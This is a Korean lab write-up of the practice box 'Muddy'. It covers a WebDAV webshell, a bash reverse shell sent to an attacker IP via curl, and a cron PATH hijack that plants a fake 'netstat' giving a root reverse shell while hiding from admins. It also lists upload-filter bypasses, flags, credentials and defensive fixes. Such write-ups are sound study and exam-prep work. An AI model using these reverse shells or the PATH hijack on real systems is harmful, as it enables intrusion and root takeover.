> [!warning] PUT이 되는데 PHP가 실행 안 되면
> 이 박스는 그냥 됐지만, 다음 세 가지가 흔한 차단이다 — **막혔을 때 순서대로 확인하라.**
> 1. **확장자 필터** → `.phtml` · `.php5` · `.php7` · `.phar` 로 우회
> 2. **디렉터리에 `php_admin_flag engine off`** → 업로드 디렉터리에서 PHP 엔진이 꺼져 있다. 다른 디렉터리로 `MOVE`(WebDAV 메서드)를 시도
> 3. **`Options -Indexes` + 실행 권한 없음** → 200이 오는데 소스가 그대로 보인다 = PHP 핸들러 미적용

### 3-4. 리버스셸

```bash
┌──(kali㉿kali)-[~/PG/Muddy]
└─$ curl -sG --user administrant:sleepless \
     --data-urlencode 'c=bash -c "bash -i >& /dev/tcp/192.168.45.207/4444 0>&1" &' \
     http://192.168.248.161/webdav/sh.php
```

> [!note] `-G` + `--data-urlencode` 조합이 핵심이다
> `--data-urlencode`는 원래 **POST 바디**를 만든다. `-G`를 붙이면 그 데이터를 **쿼리스트링으로 옮겨 GET으로 보낸다.**
> 왜 이렇게 하는가 — 페이로드에 `&`·`>`·공백·`"`가 전부 들어 있어서 **직접 URL 인코딩하면 반드시 틀린다.** 특히 `>&`의 `&`는 인코딩 안 하면 **다음 파라미터의 시작으로 해석**되어 명령이 잘린다.
> 인코딩을 curl에게 맡기는 것이 정석이다. ([[Hawat]]에서도 같은 이유로 `--data-urlencode`를 썼다)

> [!tip] 끝의 `&`가 필요한 이유
> `&`가 없으면 웹셸의 `system()`이 리버스셸 프로세스를 **기다리며 블록**한다. curl은 응답을 못 받고 멈춰 있고, PHP-FPM/Apache 워커 하나가 점유된다.
> `&`로 백그라운드에 던지면 HTTP 요청은 즉시 끝나고 셸만 남는다. **웹셸에서 리버스셸을 던질 때는 항상 `&`를 붙인다.**

---

## 4. 권한상승 — 크론 PATH 하이재킹

### 4-1. 셸을 잡자마자 치는 것

```bash
id ; sudo -l ; cat /etc/crontab ; ls -la /etc/cron.*
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

이 박스는 **세 번째 명령에서 끝난다.**

### 4-2. 발견

```bash
www-data@muddy:/$ cat /etc/crontab
SHELL=/bin/sh
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
```

**`PATH` 맨 앞이 `/dev/shm`이다.**

### 4-3. 왜 이것이 권한상승이 되는가 — PATH 탐색의 원리

셸이 `netstat` 이라는 **절대경로가 아닌 이름**을 만나면, `PATH` 환경변수를 **왼쪽부터 오른쪽으로** 순회하며 그 이름의 실행 파일을 찾는다. **첫 번째로 발견한 것을 실행하고 즉시 탐색을 멈춘다.**

이 크론의 `PATH`를 순서대로 펼치면:

```
1. /dev/shm          ← 여기서 발견되면 끝. 나머지는 보지도 않는다
2. /usr/local/sbin
3. /usr/local/bin
4. /sbin
5. /bin
6. /usr/sbin
7. /usr/bin          ← 진짜 netstat 이 여기 있다
```

`/dev/shm`은 **공유 메모리용 tmpfs로, 퍼미션이 `1777`(누구나 쓰기 가능, sticky)** 이다. 즉 `www-data`가 거기에 `netstat` 이라는 이름의 실행 파일을 만들면, **root가 돌리는 크론이 진짜 `/usr/bin/netstat` 대신 그걸 실행한다.**

> [!danger] 결함의 본체는 "절대경로를 안 썼다"가 아니다
> 흔한 오해: "크론에서 `netstat`을 절대경로 없이 불러서 취약하다."
> **절반만 맞다.** 절대경로 미사용은 관행적으로 흔하고, `PATH`가 `/sbin:/bin:/usr/sbin:/usr/bin` 같은 root 전용 디렉터리로만 구성돼 있으면 **아무 문제 없다.**
> 진짜 결함은 **`PATH` 앞쪽에 비특권 사용자가 쓸 수 있는 디렉터리가 있는 것**이다. 이 둘이 **동시에** 성립해야 익스플로잇이 된다.
> **판정 순서: ① `PATH=` 줄을 읽는다 → ② 각 디렉터리에 `ls -ld`로 쓰기 권한을 확인한다 → ③ 쓰기 가능한 것이 진짜 경로보다 앞에 있으면 성립.**

> [!tip] 쓰기 가능 디렉터리 단골 후보
> ```bash
> # PATH의 각 항목 권한을 한 번에 확인
> echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
> # 시스템 전체에서 쓰기 가능한 디렉터리
> find / -writable -type d 2>/dev/null | head -50
> ```
> 단골: **`/dev/shm`** · `/tmp` · `/var/tmp` · `/var/www` · 홈 디렉터리 · 관리자가 만든 `/opt/scripts` 류.
> `/dev/shm`은 특히 **`noexec`가 안 걸린 경우가 많아** 실행 파일을 둘 수 있다. `mount | grep shm`으로 확인할 수 있다 — `noexec`가 있으면 이 공격은 실패한다.

### 4-4. 가짜 `netstat` 작성

```bash
www-data@muddy:/dev/shm$ cat netstat
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.45.207/4445 0>&1' &
exec /usr/bin/netstat "$@"
```

> [!danger] 원래 동작을 반드시 유지하라 — `exec /usr/bin/netstat "$@"`
> 크론 명령이 `netstat ... && service apache2 status && service mysql status` 로 **`&&` 체인**이다.
> `&&`는 **왼쪽 명령의 종료 코드가 0일 때만** 오른쪽을 실행한다. 가짜 `netstat`이 0이 아닌 값을 반환하면 **체인이 끊겨** 뒤가 실행되지 않고, `/root/status`의 내용이 평소와 달라진다. 실전에서는 관리자가 이걸로 눈치챈다.
> 마지막에 진짜 바이너리를 `exec`로 넘기면 **종료 코드와 표준 출력이 그대로 보존**된다. 리버스셸은 `&`로 백그라운드에 던져 `exec` 이전에 분리한다.
>
> 각 조각의 역할:
> | 조각 | 역할 |
> |---|---|
> | `#!/bin/bash` | **셔뱅 필수.** 없으면 `sh`가 텍스트 파일을 실행하려다 실패하거나 `bash` 전용 문법(`>&`)이 안 먹는다 |
> | `bash -c '...' &` | 리버스셸을 **백그라운드**로. 이게 없으면 크론이 셸 종료를 기다리며 멈추고, 다음 주기까지 `/root/status`가 안 갱신되어 탐지된다 |
> | `exec` | **현재 프로세스를 진짜 바이너리로 교체**한다. 새 프로세스를 fork하지 않으므로 PID·종료 코드가 그대로 호출자에게 전달된다 |
> | `/usr/bin/netstat` | **반드시 절대경로.** 여기서 상대경로를 쓰면 자기 자신을 다시 부르는 **무한 재귀**가 된다 (PATH 맨 앞이 `/dev/shm`이므로) |
> | `"$@"` | 원래 인자(`-tlpn`)를 그대로 전달. 큰따옴표가 있어야 공백이 든 인자가 안 쪼개진다 |

```bash
www-data@muddy:/dev/shm$ chmod 777 netstat
```

> [!warning] `chmod +x`를 잊으면 조용히 실패한다
> 실행 비트가 없으면 셸의 PATH 탐색이 **그 파일을 후보로 치지 않고 그냥 넘어간다.** 즉 진짜 `netstat`이 정상 실행되고, 아무 에러도 안 나고, 리버스셸도 안 붙는다.
> **"크론 하이재킹을 걸었는데 아무 일도 안 일어난다"의 1순위 원인이 실행 권한 누락이다.** 2순위는 셔뱅 누락, 3순위는 `noexec` 마운트.

### 4-5. 대기와 획득

1주기(60초) 대기 후 4445 리스너:

```bash
root@muddy:~# id; hostname
uid=0(root) gid=0(root) groups=0(root)
muddy
root@muddy:~# cat /root/proof.txt
669fbcc1737f1de8851a87e3b8ff477f
```

> [!tip] 크론 대기 시간을 낭비하지 마라
> `* * * * *`(매분)이라 최대 60초지만, 주기가 5분·15분인 박스도 흔하다. **대기하는 동안 다른 열거를 계속 돌려라** — `find -perm -4000`, `getcap`, `/etc/passwd` 사용자 목록, `netstat -tlpn`으로 내부 전용 포트 확인.
> 그리고 **크론이 실제로 도는지 먼저 확인**하는 것이 안전하다. `/root/status`의 mtime을 볼 수 없으니, 대신 `/dev/shm`에 마커를 남기는 방식으로 검증할 수 있다:
> ```bash
> #!/bin/bash
> id > /dev/shm/whoami_marker 2>&1        # ← 리버스셸 대신 먼저 이걸로 검증
> exec /usr/bin/netstat "$@"
> ```
> 마커에 `uid=0(root)`가 찍히면 **하이재킹이 성공했고 리버스셸만 안 붙는 것**이라는 뜻이라, 원인을 아웃바운드 포트 쪽으로 좁힐 수 있다.

---

## 5. 플래그 — user 플래그가 표준 위치에 없다

```bash
root@muddy:~# find / -name local.txt 2>/dev/null
/var/www/local.txt
root@muddy:~# cat /var/www/local.txt
3f568bb1aacfec1b8c2d8f411f07b00b
```

| | 위치 | 값 |
|---|---|---|
| `local.txt` | **`/var/www/local.txt`** ← 홈 디렉터리 아님 | `3f568bb1aacfec1b8c2d8f411f07b00b` |
| `proof.txt` | `/root/proof.txt` | `669fbcc1737f1de8851a87e3b8ff477f` |

[[Crane]]과 같은 패턴이다 — **일반 유저 계정이 없으면 플래그는 서비스 계정의 홈(`/var/www`)에 있다.**

> [!tip] `local.txt`가 안 보이면
> ```bash
> find / -name local.txt 2>/dev/null
> find / -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' 2>/dev/null
> ```
> 후보 위치: `/home/<user>/` → **`/var/www/`** → `/srv/` → `/opt/` → `/root/`.
> `getent passwd | grep -v nologin` 으로 **로그인 가능한 계정이 있는지** 먼저 보면 어디를 뒤질지 바로 안다. 계정이 root뿐이면 서비스 홈을 본다.

> [!note] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 이렇게 한 화면에 찍어야 인정된다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 `hostname`이 있으니 그대로 쓰면 되지만, 없는 배포판에서는 `uname -n` 또는 `cat /etc/hostname`으로 대체한다. `local.txt`도 **www-data 셸에서 한 번, root 셸에서 한 번** 찍어두면 안전하다.

---

## 6. 막혔던 지점 / 시행착오

### ① `--min-rate 5000`이 만든 유령 포트 3개

첫 스캔이 **443 · 808 · 908**을 열림으로 보고했다. 808·908은 흔치 않은 포트라 "커스텀 서비스겠구나" 하고 파고들 유혹이 강하다.

```
curl http://192.168.248.161:443/     → 빈 응답
curl http://192.168.248.161:808/     → 빈 응답
curl http://192.168.248.161:908/     → 빈 응답
```

**빈 응답이 세 번 반복되면 스캔 결과를 의심해야 한다.** 낮은 레이트로 `-sS -p-` 재스캔한 결과 `Not shown: 65530 closed`, 열린 포트는 **22·25·80·111·8888 다섯 개뿐**이었다.

> [!danger] "열려 있다는데 아무 응답이 없다" → **포트를 의심하라**
> 판별 기준:
> - **RST가 온다** = 닫힘. 스캔이 틀렸다
> - **아무것도 안 온다(타임아웃)** = 필터링. 방화벽
> - **연결은 되는데 데이터가 없다** = 진짜로 서비스가 있고 클라이언트가 먼저 말해야 하는 프로토콜(banner 없는 서비스)
>
> `nc -vz <IP> <port>` 나 `nmap -sT -p <port> --reason` 으로 **연결 자체가 되는지** 5초 안에 판정할 수 있다. `--reason` 플래그는 nmap이 왜 그렇게 판정했는지(`syn-ack`/`reset`/`no-response`)를 알려주므로 오탐 추적에 가장 유용하다.
> 이 함정에 걸리면 **없는 서비스에 30분~1시간을 태운다.** 시험에서 가장 비싼 실수 유형이다.

### ② WordPress 5.7에 시간을 태울 뻔했다

포트 목록에서 가장 먼저 눈에 들어오는 것은 80번 WordPress다. 버전이 5.7로 낮고, 플러그인(kali-forms 2.3.0)도 구형이라 **CVE를 뒤지고 싶어진다.**

실제로 확인해보니:

```
wp-login.php  → /404 로 리다이렉트
wp-json       → 401
```

**인증 표면 자체가 없다.** 즉 어떤 인증 후 취약점(authenticated RCE, 플러그인 파일 업로드)을 찾아내도 **쓸 수가 없다.**

> [!warning] "화려한 표적"과 "도달 가능한 표적"을 구분하라
> WordPress는 익스플로잇 DB가 방대해서 **검색만 하면 뭔가 계속 나온다.** 그래서 시간이 무한히 녹는다.
> 이 박스가 가르치는 것은 **8888번의 정체불명 Python 서비스가 80번 WordPress보다 우선순위가 높다**는 판단이다. 이유:
> - WordPress는 **잘 알려진 소프트웨어**다. 랩 설계자가 5.7을 진짜 진입점으로 뒀다면 정상 로그인 폼을 열어뒀을 것이다
> - 8888번은 **아무도 안 쓰는 프레임워크(Ladon)** 다. 랩에서 굳이 이런 걸 띄웠다는 것 자체가 의도의 표시다
>
> **일반 규칙: 유명 CMS가 봉쇄돼 있고 정체불명 서비스가 함께 떠 있으면, 정체불명 쪽이 정답이다.**

### ③ "LFI"라고 적힌 노트를 믿고 파라미터를 찾았다

기존 노트에 **LFI**로 분류돼 있었다. LFI라면 `?page=`·`?file=`·`?include=` 같은 파라미터가 있어야 하는데, **80번에도 8888번에도 그런 파라미터가 없다.**

없는 것을 계속 찾는 것이 가장 나쁜 시간 소모다. 전환점은 **"입력이 어떤 형식으로 들어가는가"** 를 다시 본 것이었다 — `uid`는 쿼리스트링이 아니라 **SOAP XML 바디**로 들어간다. 그 순간 XXE로 방향이 잡혔다.

> [!tip] 분류를 못 믿을 때의 자가 판정 절차
> 1. **사용자 입력이 서버에 도달하는 모든 경로를 나열한다** — 쿼리스트링 · 폼 바디 · 헤더 · 쿠키 · **XML/JSON 바디** · 업로드 파일명 · 업로드 파일 내용
> 2. 각 입력이 **어떤 형식으로 파싱되는가**를 본다 — 문자열? XML? JSON? YAML? 직렬화 객체?
> 3. 형식이 정해지면 취약점 후보가 자동으로 좁혀진다:
>    - 문자열 → LFI · SQLi · 커맨드 인젝션 · SSTI
>    - **XML → XXE · XPath 인젝션 · XML 폭탄**
>    - JSON → 프로토타입 오염 · 타입 혼동
>    - YAML → 역직렬화 RCE
>    - 직렬화 객체 → 역직렬화 RCE
>
> **"파라미터가 없다"는 막다른 길이 아니라 "입력 형식이 다르다"는 신호다.**

### ④ `<`가 든 파일에서 트레이스백이 나와 실패로 오인

`apache2.conf`를 읽어 `AuthUserFile` 값을 확인하려 했으나 이게 돌아왔다:

```
UnboundLocalError: local variable 'req_dict' referenced before assignment
```

`/etc/passwd`는 잘 읽혔는데 이 파일만 안 되니 **"방금 그건 우연이었나"** 싶어진다. 실제로는 2-7에서 설명한 대로 **파싱 붕괴**이고, 취약함의 증거다.

그래서 우회 대신 **관례 경로 추측**으로 갔다 — `/var/www/html/webdav/passwd.dav`와 `/etc/apache2/passwd.dav`. 둘 다 나왔다.

> [!danger] 같은 익스플로잇에서 **일부 입력만 실패**하면, 실패한 입력의 특성을 봐라
> "A는 되는데 B는 안 된다"는 취약점이 없다는 뜻이 아니라 **B에 뭔가 특별한 게 있다**는 뜻이다. 여기서는 `<` 문자였다.
> 확인법도 간단하다 — 실패한 파일을 `head -1`만 읽어보거나, **확실히 `<`가 없는 다른 파일**(`/etc/hostname`)을 하나 더 읽어서 익스플로잇 자체가 살아 있음을 재확인한다. 30초면 판정된다.

### ⑤ 웹셸은 올렸는데 401이 돌아왔다

`curl -T`로 `201 Created`를 받고, 곧바로 브라우저에서 `http://192.168.248.161/webdav/sh.php?c=id`를 열었더니 **401**이 나왔다.

`201`을 받았으니 파일은 분명히 있는데 401이 나오면, **"업로드가 실제로는 실패했나"·"확장자가 막혔나"·"WebDAV가 PUT을 흉내만 냈나"** 같은 잘못된 가설로 빠지기 쉽다.

원인은 단순하다 — **`/webdav/`는 `GET`에도 Basic auth를 요구한다.** `--user`를 붙이면 즉시 `uid=33(www-data)`가 나온다.

> [!warning] 401 · 403 · 404 · 500을 각각 다르게 읽어라
> | 코드 | 의미 | 다음 행동 |
> |---|---|---|
> | `401` | **인증이 필요하다** | 자격증명을 붙인다. 파일 존재 여부와 무관 |
> | `403` | 인증됐거나 인증 불필요인데 **정책이 막는다** | 다른 경로·다른 메서드. `.ht*` 차단 같은 정적 규칙 의심 |
> | `404` | 없다 | 경로 추측을 다시 |
> | `500` | **코드가 실행되다 죽었다** | 가장 값진 응답. 입력이 싱크에 도달했다는 뜻 |
>
> 이 박스는 **401·403·500을 전부 만나고 셋 다 다른 의미로 썼다.** 500(traceback)은 버전 판정에, 403(`.htpasswd`)은 "HTTP로는 못 얻는다"의 확정에, 401은 "인증 붙여라"에 쓰였다.

### ⑥ 스크린샷 4장이 전부 오류 페이지였다

정찰 단계에서 헤드리스 Chrome으로 캡처한 스크린샷 4장이 **전부 `ERR_ADDRESS_UNREACHABLE` 오류 페이지**였다.

파일 크기(수십 KB)와 색상 수는 정상 캡처와 구분이 안 됐다. **실제로 열어보고서야 걸러냈다.**

> [!danger] 캡처 파일은 **크기만 보지 말고 반드시 열어서 내용을 확인하라**
> 헤드리스 브라우저는 연결에 실패해도 **오류 페이지를 정상적으로 렌더링해서 PNG를 만든다.** 종료 코드도 0이다. 즉 **자동화 파이프라인에서는 성공으로 보인다.**
> 이게 위험한 이유는 스크린샷이 잘못 나오는 것 자체가 아니라, **"캡처가 됐으니 서비스가 살아 있구나"라는 잘못된 확정 사실이 노트에 박히는 것**이다. 뒤의 판단이 전부 그 위에 쌓인다.
> 검증 절차:
> ```bash
> # 최소한 이 정도는 한다 — 오류 페이지는 대개 순백 배경 + 소수 색상
> file x.png && identify -format '%wx%h %k colors\n' x.png
> ```
> 하지만 **가장 확실한 것은 그냥 여는 것**이다. OSCP 시험에서는 스크린샷이 **증거**이므로 이 습관은 점수와 직결된다 — 오류 페이지를 증거로 제출하면 그 플래그는 인정 안 된다.
> **일반화: 자동화가 만든 산출물은 "생성됐다"와 "올바르다"가 다르다.** 이 노트에 남긴 스크린샷 2장은 실제로 열어서 내용을 확인한 것이다.

### ⑦ 버전을 0.9.30–0.9.40까지밖에 못 좁혔다

traceback 대조는 강력했지만 **한계가 있었다.** 세 파일이 0.9.30~0.9.40 구간에서 바이트 동일이라 더 이상 좁힐 수 없었다.

여기서 두 가지 선택이 있었다:
- **(A)** 다른 파일에서 추가 traceback을 유도해 더 좁힌다
- **(B)** "0.9.x, 1.0 미만"으로 확정하고 진도를 나간다

**(B)를 골랐다.** 이유는 XXE 싱크(`make_parser()` 하드닝 부재)가 **0.9 전 구간에 공통**이라, 세부 버전을 알아도 익스플로잇이 달라지지 않기 때문이다.

> [!tip] 버전 특정은 **그것이 행동을 바꿀 때만** 가치가 있다
> 세부 버전이 필요한 경우는 딱 둘이다 — ① 특정 패치 버전에서만 통하는 공개 익스플로잇을 쓸 때, ② 보고서에 CVE를 매핑해야 할 때.
> 이 박스는 둘 다 아니다. **"충분히 좁혀졌으면 멈춘다"** 는 판단이 시험에서는 특히 중요하다.
> 그리고 못 좁힌 사실은 **노트에 "미확정"으로 남긴다.** 나중에 "0.9.40이었다"고 잘못 기억하는 것보다 낫다.

### ⑧ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 판단 |
|---|---|
| 유령 포트 3개(443·808·908) | **10분 안에 손절.** `--reason` 재스캔 한 번이면 끝났다 |
| WordPress 5.7 | **15분 안에 손절.** `wp-login.php`가 404면 그 순간 접는다 |
| Ladon 버전 특정 | 익스플로잇에 영향이 없다고 판단되면 **더 좁히지 않는다** |
| `apache2.conf` XXE 우회(OOB DTD) | **시도조차 안 하는 것이 정답.** 목표 파일이 평문이었다 |
| 크론 대기 | 60초 — 대기 중 다른 열거를 병행 |

**이 박스에서 실제로 시간을 태울 수 있는 지점은 전부 "가짜 표적"이었다.** ①②는 스캐너/유명 소프트웨어가 만든 미끼, ④는 익스플로잇 성공을 실패로 오인, ⑦은 필요 없는 정밀도 추구.
공통점은 하나다 — **"지금 이게 목표에 가까워지는가?"** 를 5분마다 자문했다면 전부 피할 수 있었다.

---

## 7. OSCP 시험 관점

1. **`--min-rate`를 높이면 오탐이 생긴다.** 이 박스는 443·808·908을 유령으로 보고했다. **빠른 스캔은 1차 필터로만 쓰고, 익스플로잇 대상 포트는 낮은 레이트로 재확인**한다. `nmap --reason`으로 판정 근거(`syn-ack`/`reset`/`no-response`)를 본다. "열려 있다는데 응답이 비어 있다"면 서비스가 아니라 포트를 의심하라.
2. **파일명 파라미터가 없으면 XML 입력을 의심하라.** LFI로 알려진 박스가 실제로는 XXE였다. **입력이 도달하는 모든 경로를 나열하고, 각각이 어떤 형식으로 파싱되는지**를 보면 취약점 후보가 자동으로 좁혀진다.
3. **`WSGIServer/0.1 Python/2.7.x`는 레거시+개발 설정 신호다.** Python 2.7 `xml.sax`/`minidom`은 **`feature_external_ges`가 기본 활성**이라 하드닝 없이 XML을 파싱하면 그대로 XXE다. Java `DocumentBuilderFactory`, PHP libxml<2.9도 같은 "안전하지 않은 기본값" 계열이다.
4. **⚠️ 금지 도구 없음 — 이 박스는 전 구간이 수동이다.** 그래도 자동 도구를 쓰고 싶어지는 지점과 수동 대안을 짝지어 둔다:
   | 자동 도구 (시험 금지/제한) | 수동 대안 |
   |---|---|
   | XXE 스캐너·Burp Scanner | `curl --data-binary @-` + heredoc으로 DTD 직접 작성 |
   | `wpscan` | `curl -I wp-login.php`로 **인증 표면 존재 여부부터** 판정 |
   | `davtest` / `cadaver` | `curl -T` (PUT) · `curl -X PROPFIND` · `curl -X OPTIONS` |
   | `linpeas` (허용이지만 느림/시끄러움) | `id` · `sudo -l` · `cat /etc/crontab` · `find / -perm -4000` · `getcap -r /` 5줄 |
5. **XXE로 `<`가 든 파일은 못 읽는다.** 읽어온 내용이 **다시 XML로 파싱**되기 때문이다. 트레이스백이 돌아오면 "취약하지 않다"가 아니라 **"이 파일은 이 방식으로 못 읽는다"**는 뜻이고, 오히려 취약함의 방증이다. 우회는 **OOB DTD**(파라미터 엔티티 `%`로 공격자 서버 DTD를 불러 데이터를 URL에 실어 보냄) 또는 **`php://filter` base64**(PHP 한정). 단 **목표가 평문이면 쓰지 마라 — 과잉 대응 금지.**
6. **에러 페이지·traceback은 버전 판정의 1급 근거다.** 배너는 위조되지만 스택 트레이스는 실행 중인 코드에서 나온다. **일부러 500을 유도**해 파일 경로·행 번호·소스 텍스트를 얻고, PyPI/npm/Maven 배포본의 같은 행과 대조하라. 단 **행동을 바꾸지 않는 정밀도는 추구하지 마라.**
7. **해시 접두어로 포맷을 판별한다.** `$apr1$`=Apache MD5(john `md5crypt`, hashcat `1600`) · `$1$`=md5crypt · `$5$`=SHA-256 · `$6$`=SHA-512 · `$2y$`=bcrypt · `$y$`=yescrypt. **`--format`이 틀리면 영영 안 깨진다.** `$y$`는 크랙 가능성이 낮으니 시간을 태우지 말고 다른 경로를 찾아라.
8. **인증이 걸린 디렉터리는 업로드한 파일을 호출할 때도 인증이 필요하다.** `--user`를 빼서 나온 401을 업로드 실패로 오인하지 말 것. **401(인증 필요)·403(정책 차단)·404(없음)·500(코드가 실행되다 죽음)을 각각 다르게 읽어라** — 특히 500이 가장 값진 응답이다.
9. **`.ht*`가 403이면 Apache 기본 `<FilesMatch "^\.ht">` 차단이다.** 파일 존재의 증명은 아니지만 **"HTTP로는 절대 못 가져온다"는 확정**이다 → HTTP를 우회하는 읽기 원시 함수(XXE·LFI·SSRF)를 찾아야 한다는 신호로 읽는다.
10. **크론은 `PATH=` 줄부터 본다.** 상대경로 호출 자체가 아니라 **쓰기 가능한 디렉터리가 PATH 앞에 있는 것**이 결함의 본체다. 판정: `echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null`. 단골은 `/dev/shm`·`/tmp`·`/var/tmp`·`/opt/scripts`. **`mount | grep shm`으로 `noexec` 여부도 확인**한다.
11. **하이재킹 바이너리는 원래 동작을 보존하라.** `exec /usr/bin/netstat "$@"`. 크론이 `&&` 체인이면 종료 코드가 0이 아닐 때 뒤가 안 돌아 관리자가 눈치챈다. **`exec` + 절대경로 + `"$@"`** 3종 세트가 정석이고, 절대경로를 빼면 **자기 자신을 부르는 무한 재귀**가 된다.
12. **크론 하이재킹이 무반응이면 순서대로 의심하라** — ① `chmod +x` 누락 ② 셔뱅(`#!/bin/bash`) 누락 ③ `noexec` 마운트 ④ 아웃바운드 포트 차단. **리버스셸 대신 `id > /dev/shm/marker`로 먼저 검증**하면 ①~③과 ④를 분리할 수 있다.
13. **`local.txt`가 홈에 없으면 `/var/www`를 본다.** `getent passwd | grep -v nologin`으로 로그인 가능한 계정을 먼저 확인하면 어디를 뒤질지 즉시 안다. 계정이 root뿐이면 서비스 계정 홈이다. ([[Crane]]과 동일)
14. **스크린샷은 반드시 열어서 확인하라.** 헤드리스 브라우저는 연결 실패 시에도 **오류 페이지를 정상 렌더링해 PNG를 만들고 종료 코드 0을 반환**한다. 시험에서 스크린샷은 증거이므로 오류 페이지를 제출하면 그 플래그는 인정되지 않는다.
15. **유명 CMS가 봉쇄돼 있고 정체불명 서비스가 함께 떠 있으면, 정체불명 쪽이 정답이다.** 랩 설계자가 WordPress를 진입점으로 뒀다면 로그인 폼을 열어뒀을 것이다. **"화려한 표적"과 "도달 가능한 표적"을 구분**하고, 도달 가능성(①인증 없이 닿는가 ②입력을 받는가 ③위험한 싱크에 닿는가)으로 우선순위를 매겨라.

---

## 8. 방어 관점

| 결함 | 왜 위험한가 | 조치 |
|---|---|---|
| **XML 파서에 외부 엔티티 하드닝 부재** (`ladon/interfaces/soap.py:645`, `xmlrpc.py:304`) | Python 2.7 expat 기본값이 `feature_external_ges=True`라 **아무것도 안 하면 임의 파일 읽기**가 성립 | `parser.setFeature(feature_external_ges, False)` 명시. 더 확실하게는 `defusedxml`로 전면 교체 |
| **Python 2.7 (EOL 2020) 운용** | 보안 패치가 나오지 않는다. 프레임워크·라이브러리도 함께 방치된다 | Python 3 + 유지보수되는 RPC 프레임워크로 이전 |
| **Ladon 0.9.x 사용** | 상류에서 유지보수가 사실상 중단된 프레임워크 | 대체 스택 검토. 유지 불가피하면 파서 하드닝을 직접 패치 |
| **개발용 `WSGIServer`를 외부 노출** | 프로덕션 방어 기능(요청 크기 제한·타임아웃·에러 은닉)이 전혀 없다 | gunicorn/uWSGI + 리버스 프록시 뒤로. 8888은 방화벽으로 외부 차단 |
| **런타임 traceback을 응답에 노출** | 라이브러리 버전·설치 경로·소스 코드가 그대로 유출되어 **버전 특정과 취약점 매핑을 공격자에게 대신 해준다** | `DEBUG=False` 상당의 설정. 500 응답은 일반 메시지 + 서버 로그에만 상세 기록 |
| **웹셸이 업로드 가능한 WebDAV** (`/var/www/html/webdav/`) | 파일 업로드가 곧 RCE. 인증만이 유일한 방벽이다 | ① 업로드 디렉터리에서 PHP 엔진 비활성(`php_admin_flag engine off`) ② 웹루트 밖에 저장 ③ 확장자 화이트리스트 |
| **`passwd.dav`가 웹루트 안에 존재** | 웹서버가 서빙 가능한 위치에 자격증명 저장소가 있다. 설정 실수 하나로 즉시 유출 | `AuthUserFile`은 **반드시 웹루트 밖**(`/etc/apache2/`)에만 둔다. 웹루트 안 사본은 삭제 |
| **약한 비밀번호 (`sleepless`, rockyou 1초 크랙)** | `$apr1$`는 반복 1000회 MD5로 **GPU에 매우 약하다**. 사전 단어면 즉사 | 길이 12자 이상 랜덤. 해시도 bcrypt(`htpasswd -B`)로 전환 |
| **크론 `PATH`에 `/dev/shm` 선두 배치** | `1777` 디렉터리가 root 크론의 탐색 경로 맨 앞. **이 하나가 root 권한상승의 전부다** | `PATH`에서 제거. root 크론 `PATH`는 `/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`만 |
| **크론에서 명령을 상대경로로 호출** | 위 결함과 결합해야 성립하지만, 심층 방어 차원에서 함께 고쳐야 한다 | `/usr/bin/netstat -tlpn` 처럼 **절대경로** 사용 |
| **`/dev/shm`이 `noexec` 없이 마운트** | 비특권 사용자가 실행 파일을 놓을 수 있다 | `/etc/fstab`에 `tmpfs /dev/shm tmpfs defaults,noexec,nosuid,nodev 0 0`. `/tmp`·`/var/tmp`도 동일 |
| **WordPress를 봉쇄만 하고 방치** | `wp-login.php` 리다이렉트는 접근 제어가 아니라 **은닉**이다. 우회 경로(XML-RPC·REST)가 남으면 무의미 | 안 쓰면 제거. 쓰면 정식으로 접근 제어 + 최신 유지 |

---

## 9. 참고 자료

- **OWASP — XML External Entity (XXE) Processing**: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- **OWASP Cheat Sheet — XXE Prevention** (언어별 하드닝 코드): https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- **PayloadsAllTheThings — XXE Injection** (OOB DTD 템플릿 포함): https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- **Python `defusedxml`** — 표준 XML 모듈의 안전한 대체: https://pypi.org/project/defusedxml/
- **Python `xml` 보안 주의사항** (공식 문서의 취약성 표): https://docs.python.org/3/library/xml.html#xml-vulnerabilities
- **Ladon for Python (PyPI)** — 버전 대조에 사용한 sdist 출처: https://pypi.org/project/ladon/
- **Apache `htpasswd`** — `$apr1$` 포맷 정의: https://httpd.apache.org/docs/2.4/programs/htpasswd.html
- **HackTricks — Linux PATH 하이재킹**: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- CVE 없음 — **프레임워크의 안전하지 않은 기본값 + 크론 설정 오류**의 조합이다 (OWASP A05: Security Misconfiguration)

---

## 남긴 흔적 (정리 완료)

`chmod +s` 같은 시스템 바이너리 권한 변경은 **하지 않았다** — 리버스셸만 썼다.

| 생성물 | 상태 |
|---|---|
| `/var/www/html/webdav/sh.php` | 삭제 |
| `/var/www/html/webdav/ns.txt` | 삭제 |
| `/dev/shm/netstat` | 삭제 |

정리 후 확인: `/dev/shm/` 비어 있음, `/var/www/html/webdav/`에 원래의 `passwd.dav`만 남음. `/root/status`는 타겟 자체 크론의 산출물이라 그대로 뒀다.

획득 자격증명: `administrant` / `sleepless` (WebDAV Basic auth).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[01. Pentest Foundations]] — Muddy 항목
- [[Crane]] — `local.txt`가 `/var/www`에 있던 사례
- [[Levram]] · [[RubyDome]] — 개발 서버 배너가 단서였던 사례
- [[Hub]] · [[Astronaut]] — "버전 판정은 독립 근거 2개" 패턴
- [[Exfiltrated]] · [[Astronaut]] — 크론 기반 권한상승
- [[Hawat]] — `--data-urlencode`로 인용 중첩을 회피한 동일 기법
